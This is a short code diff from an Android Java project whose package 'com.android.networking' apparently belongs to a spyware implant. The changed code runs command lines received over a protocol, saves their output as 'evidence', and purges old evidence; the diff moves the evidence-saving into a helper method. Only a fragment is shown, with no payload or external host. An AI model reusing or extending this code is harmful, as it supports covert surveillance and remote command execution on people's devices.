@@ -30,7 +30,7 @@ import com.android.networking.crypto.SHA1Digest;
 
 import com.android.networking.evidence.EvidenceCollector;
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Directory;
 import com.android.networking.file.Path;
@@ -1004,7 +1004,7 @@ public class ZProtocol extends Protocol {
 
 					ExecuteResult ret = Execute.execute(executionLine);
 
-					saveExecutionEvidence(ret);
+					ret.saveEvidence();
 					
 				}
 
@@ -1030,17 +1030,7 @@ public class ZProtocol extends Protocol {
 		}
 	}
 
-	private void saveExecutionEvidence(ExecuteResult ret) {
-		//Evidence evidence = new Evidence(EvidenceType.COMMAND);
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (parseExecute) Output:" + ret.getStdout());
-		}
 
-		byte[] content =  WChar.getBytes(ret.getStdout(),true);
-		final byte[] additional = WChar.pascalize(ret.executionLine);
-
-		LogR.atomic(EvidenceType.COMMAND, additional, content);
-	}
 
 	protected void purgeEvidences(final String basePath, Date date, int size) {
 		if (Cfg.DEBUG) {
